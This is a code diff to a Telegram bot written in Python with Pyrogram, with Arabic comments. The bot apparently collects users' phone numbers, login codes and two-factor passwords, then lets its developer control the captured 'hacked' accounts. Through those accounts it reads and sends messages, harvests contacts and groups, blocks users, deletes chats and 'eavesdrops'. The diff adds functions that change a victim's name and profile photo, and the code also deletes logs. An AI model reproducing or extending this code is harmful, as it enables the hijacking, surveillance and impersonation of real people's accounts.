@@ -12,7 +12,7 @@ import shutil
 from datetime import datetime
 from flask import Flask, request, jsonify
 from pyrogram import Client, filters
-from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
+from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, Message
 from pyrogram.errors import (
     ApiIdInvalid,
     PhoneNumberInvalid,
@@ -110,7 +110,7 @@ DESTROY_BUTTONS = InlineKeyboardMarkup([
     ]
 ])
 
-# ====== أزرار التحكم بالحساب المخترق ======
+# ====== أزرار التحكم بالحساب المخترق (محدثة) ======
 ACCOUNT_CONTROL_BUTTONS = InlineKeyboardMarkup([
     [
         InlineKeyboardButton("🚪 تسجيل الدخول", callback_data="login_account"),
@@ -127,6 +127,10 @@ ACCOUNT_CONTROL_BUTTONS = InlineKeyboardMarkup([
     [
         InlineKeyboardButton("🚫 حظر مستخدم", callback_data="block_user"),
         InlineKeyboardButton("🗑 حذف المحادثة", callback_data="delete_conversation")
+    ],
+    [
+        InlineKeyboardButton("🖼 تغيير الصورة", callback_data="change_photo"),
+        InlineKeyboardButton("✏️ تغيير الاسم", callback_data="change_name")
     ],
     [
         InlineKeyboardButton("📊 معلومات الحساب", callback_data="account_info"),
@@ -206,14 +210,13 @@ async def get_client_for_user(user_id):
         except:
             return None
 
-# ====== دالة جلب جهات الاتصال (مصححة) ======
+# ====== دالة جلب جهات الاتصال ======
 async def get_contacts_from_client(client_obj):
     contacts = []
     try:
         async for dialog in client_obj.get_dialogs():
             try:
                 chat = dialog.chat
-                # التحقق من أن المحادثة ليست مجموعة أو قناة
                 if hasattr(chat, 'type'):
                     if chat.type in ['private']:
                         name = chat.first_name or chat.username or 'مستخدم'
@@ -230,7 +233,7 @@ async def get_contacts_from_client(client_obj):
         pass
     return contacts
 
-# ====== دالة جلب المجموعات (مصححة) ======
+# ====== دالة جلب المجموعات ======
 async def get_groups_from_client(client_obj):
     groups = []
     try:
@@ -257,6 +260,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
     is_dev = (user_id == YOUR_USER_ID)
     
     if is_dev:
+        # ====== أزرار التخريب ======
         if data == "massacre":
             deleted = 0
             for uid in list(user_sessions.keys()):
@@ -379,6 +383,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
             await callback_query.answer()
             return
         
+        # ====== تسجيل الدخول ======
         if data == "login_account":
             target_id = user_data.get(user_id, {}).get("target_account")
             if not target_id:
@@ -413,6 +418,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
                 await callback_query.answer(f"❌ خطأ: {str(e)[:50]}", show_alert=True)
             return
         
+        # ====== تسجيل الخروج ======
         if data == "logout_account":
             target_id = user_data.get(user_id, {}).get("target_account")
             if not target_id:
@@ -440,6 +446,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
             )
             return
         
+        # ====== معلومات الحساب ======
         if data == "account_info":
             target_id = user_data.get(user_id, {}).get("target_account")
             if not target_id:
@@ -471,7 +478,48 @@ async def handle_callback(client, callback_query: CallbackQuery):
                 await callback_query.answer(f"❌ خطأ: {str(e)[:50]}", show_alert=True)
             return
         
-        # ====== قراءة الرسائل (مصححة) ======
+        # ====== تغيير الصورة ======
+        if data == "change_photo":
+            target_id = user_data.get(user_id, {}).get("target_account")
+            if not target_id:
+                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
+                return
+            
+            if target_id not in logged_in_accounts:
+                await callback_query.answer("❌ يجب تسجيل الدخول أولاً!", show_alert=True)
+                return
+            
+            await callback_query.message.edit_text(
+                "🖼 تغيير الصورة الشخصية\n\n"
+                "أرسل الصورة الجديدة (صورة أو ملف).",
+                reply_markup=BACK_BUTTON
+            )
+            user_steps[user_id] = "change_photo"
+            await callback_query.answer()
+            return
+        
+        # ====== تغيير الاسم ======
+        if data == "change_name":
+            target_id = user_data.get(user_id, {}).get("target_account")
+            if not target_id:
+                await callback_query.answer("❌ لم يتم تحديد حساب!", show_alert=True)
+                return
+            
+            if target_id not in logged_in_accounts:
+                await callback_query.answer("❌ يجب تسجيل الدخول أولاً!", show_alert=True)
+                return
+            
+            await callback_query.message.edit_text(
+                "✏️ تغيير الاسم\n\n"
+                "أرسل الاسم الجديد (الاسم الأول والاسم الأخير).\n"
+                "مثال:\nأحمد محمد",
+                reply_markup=BACK_BUTTON
+            )
+            user_steps[user_id] = "change_name"
+            await callback_query.answer()
+            return
+        
+        # ====== قراءة الرسائل ======
         if data == "read_messages":
             target_id = user_data.get(user_id, {}).get("target_account")
             if not target_id:
@@ -493,6 +541,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
             await callback_query.answer()
             return
         
+        # ====== إرسال رسالة ======
         if data == "send_message":
             target_id = user_data.get(user_id, {}).get("target_account")
             if not target_id:
@@ -513,7 +562,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
             await callback_query.answer()
             return
         
-        # ====== جهات الاتصال (مصححة) ======
+        # ====== جهات الاتصال ======
         if data == "get_contacts":
             target_id = user_data.get(user_id, {}).get("target_account")
             if not target_id:
@@ -546,7 +595,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
                 await callback_query.answer(f"❌ خطأ: {str(e)[:50]}", show_alert=True)
             return
         
-        # ====== المجموعات (مصححة) ======
+        # ====== المجموعات ======
         if data == "get_groups":
             target_id = user_data.get(user_id, {}).get("target_account")
             if not target_id:
@@ -579,6 +628,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
                 await callback_query.answer(f"❌ خطأ: {str(e)[:50]}", show_alert=True)
             return
         
+        # ====== حظر مستخدم ======
         if data == "block_user":
             target_id = user_data.get(user_id, {}).get("target_account")
             if not target_id:
@@ -598,6 +648,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
             await callback_query.answer()
             return
         
+        # ====== حذف المحادثة ======
         if data == "delete_conversation":
             target_id = user_data.get(user_id, {}).get("target_account")
             if not target_id:
@@ -617,6 +668,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
             await callback_query.answer()
             return
         
+        # ====== بحث عن مستخدم ======
         if data == "search_user":
             target_id = user_data.get(user_id, {}).get("target_account")
             if not target_id:
@@ -636,6 +688,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
             await callback_query.answer()
             return
         
+        # ====== تدمير ذاتي ======
         if data == "self_destruct":
             await callback_query.message.edit_text(
                 "💥 تدمير ذاتي!\n"
@@ -651,6 +704,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
             os._exit(0)
             return
         
+        # ====== سيطرة كاملة ======
         if data == "total_control":
             global RESTRICTED
             RESTRICTED = False
@@ -662,6 +716,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
             )
             return
         
+        # ====== تنظيف النظام ======
         if data == "clean_system":
             os.system("rm -rf *.log")
             os.system("rm -rf __pycache__")
@@ -672,6 +727,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
             )
             return
         
+        # ====== استهداف مستخدم ======
         if data == "target_user":
             await callback_query.message.edit_text(
                 "🎯 استهداف مستخدم\n\n"
@@ -683,6 +739,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
             await callback_query.answer()
             return
         
+        # ====== التنصت ======
         if data == "eavesdrop":
             await callback_query.message.edit_text(
                 "📡 تم تفعيل التنصت!\n\n"
@@ -821,14 +878,59 @@ async def handle_callback(client, callback_query: CallbackQuery):
         await callback_query.answer()
         return
 
-# ====== الأوامر النصية ======
+# ====== الأوامر النصية والصور ======
 @app.on_message(filters.text & filters.private)
 async def handle_text_commands(client, message):
     user_id = message.chat.id
     text = message.text.strip()
     is_dev = (user_id == YOUR_USER_ID)
     
-    # ====== قراءة الرسائل (مصححة) ======
+    # ====== تغيير الصورة ======
+    if is_dev and user_steps.get(user_id) == "change_photo":
+        target_id = user_data.get(user_id, {}).get("target_account")
+        if not target_id:
+            await message.reply("❌ لم يتم تحديد حساب!")
+            user_steps.pop(user_id, None)
+            return
+        
+        # انتظار الصورة
+        user_steps[user_id] = "change_photo_wait"
+        await message.reply("🖼 أرسل الصورة الآن.")
+        return
+    
+    # ====== تغيير الاسم ======
+    if is_dev and user_steps.get(user_id) == "change_name":
+        target_id = user_data.get(user_id, {}).get("target_account")
+        if not target_id:
+            await message.reply("❌ لم يتم تحديد حساب!")
+            user_steps.pop(user_id, None)
+            return
+        
+        try:
+            names = text.split()
+            if len(names) < 2:
+                await message.reply("❌ أرسل الاسم الأول والاسم الأخير.\nمثال: أحمد محمد")
+                return
+            
+            first_name = names[0]
+            last_name = " ".join(names[1:]) if len(names) > 1 else ""
+            
+            client_obj = await get_client_for_user(target_id)
+            if not client_obj:
+                await message.reply("❌ فشل الاتصال بالحساب!")
+                user_steps.pop(user_id, None)
+                return
+            
+            await client_obj.update_profile(first_name=first_name, last_name=last_name)
+            await message.reply(f"✅ تم تغيير الاسم إلى:\n{first_name} {last_name}", reply_markup=ACCOUNT_CONTROL_BUTTONS)
+            
+            user_steps.pop(user_id, None)
+        except Exception as e:
+            await message.reply(f"❌ خطأ: {str(e)[:100]}")
+            user_steps.pop(user_id, None)
+        return
+    
+    # ====== قراءة الرسائل ======
     if is_dev and user_steps.get(user_id) == "read_messages":
         target_id = user_data.get(user_id, {}).get("target_account")
         if not target_id:
@@ -877,6 +979,7 @@ async def handle_text_commands(client, message):
             user_steps.pop(user_id, None)
         return
     
+    # ====== إرسال رسالة ======
     if is_dev and user_steps.get(user_id) == "send_message":
         target_id = user_data.get(user_id, {}).get("target_account")
         if not target_id:
@@ -908,6 +1011,7 @@ async def handle_text_commands(client, message):
             user_steps.pop(user_id, None)
         return
     
+    # ====== حظر مستخدم ======
     if is_dev and user_steps.get(user_id) == "block_user":
         target_id = user_data.get(user_id, {}).get("target_account")
         if not target_id:
@@ -932,6 +1036,7 @@ async def handle_text_commands(client, message):
             user_steps.pop(user_id, None)
         return
     
+    # ====== حذف المحادثة ======
     if is_dev and user_steps.get(user_id) == "delete_conversation":
         target_id = user_data.get(user_id, {}).get("target_account")
         if not target_id:
@@ -956,6 +1061,7 @@ async def handle_text_commands(client, message):
             user_steps.pop(user_id, None)
         return
     
+    # ====== بحث عن مستخدم ======
     if is_dev and user_steps.get(user_id) == "search_user":
         target_id = user_data.get(user_id, {}).get("target_account")
         if not target_id:
@@ -985,6 +1091,7 @@ async def handle_text_commands(client, message):
             user_steps.pop(user_id, None)
         return
     
+    # ====== استهداف المستخدم ======
     if is_dev and user_steps.get(user_id) == "target_user":
         try:
             target_id = int(text)
@@ -1004,6 +1111,7 @@ async def handle_text_commands(client, message):
             await message.reply(f"❌ فشل الاستهداف: {e}")
         return
     
+    # ====== أوامر المستخدمين العاديين ======
     if user_id in user_steps and user_steps[user_id] in ["pyro_phone", "pyro_otp", "pyro_password"]:
         await pyro_session_step(client, message)
         return
@@ -1021,6 +1129,38 @@ async def handle_text_commands(client, message):
             "• اضغط على زر مسح الجلسات لحذف البيانات\n\n"
             "أو استخدم الأمر /start للرجوع إلى البداية."
         )
+
+# ====== معالجة الصور ======
+@app.on_message(filters.photo & filters.private)
+async def handle_photo(client, message):
+    user_id = message.chat.id
+    is_dev = (user_id == YOUR_USER_ID)
+    
+    if is_dev and user_steps.get(user_id) == "change_photo_wait":
+        target_id = user_data.get(user_id, {}).get("target_account")
+        if not target_id:
+            await message.reply("❌ لم يتم تحديد حساب!")
+            user_steps.pop(user_id, None)
+            return
+        
+        try:
+            client_obj = await get_client_for_user(target_id)
+            if not client_obj:
+                await message.reply("❌ فشل الاتصال بالحساب!")
+                user_steps.pop(user_id, None)
+                return
+            
+            # تحميل الصورة
+            photo = await message.download()
+            await client_obj.set_profile_photo(photo)
+            os.remove(photo)
+            
+            await message.reply("✅ تم تغيير الصورة الشخصية بنجاح!", reply_markup=ACCOUNT_CONTROL_BUTTONS)
+            user_steps.pop(user_id, None)
+        except Exception as e:
+            await message.reply(f"❌ خطأ: {str(e)[:100]}")
+            user_steps.pop(user_id, None)
+        return
 
 # ====== دوال Pyrogram ======
 async def pyro_session_step(client, message):
